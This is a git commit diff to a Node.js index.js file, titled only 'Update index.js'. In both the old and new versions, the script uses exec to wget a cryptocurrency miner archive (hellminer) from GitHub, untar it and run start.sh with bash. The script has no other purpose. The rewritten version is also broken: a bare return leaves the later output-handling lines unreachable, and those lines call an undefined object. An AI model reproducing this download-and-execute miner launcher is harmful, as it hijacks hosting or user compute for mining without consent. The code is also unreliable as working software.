2fdb7152ad2ba36981f365e891dbb6bc3a8dae03
RIFAIGGZ <76506048+itsmeR1F4I@users.noreply.github.com>
2022-06-01 09:45:15 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,16 +1,7 @@
 const { exec, spawn, execSync } = require("child_process")
 console.log('STARTING...');
-exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh', (error, stderr, stdout) => {
-if (error) {
-console.log(`error: ${error.message}`);
-return;
-}
-
-if (stderr) {
-console.log(`stderr: ${stderr}`);
-return;
-}
-
-console.log(`stdout: ${stdout}`)
-console.log('END OF OPERATION...');
-});
+rifai = exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh')
+return rifai;
+let { stdout, stderr } = rifai
+    if (stdout.trim()) m.reply(stdout)
+    if (stderr.trim()) m.reply(stderr)
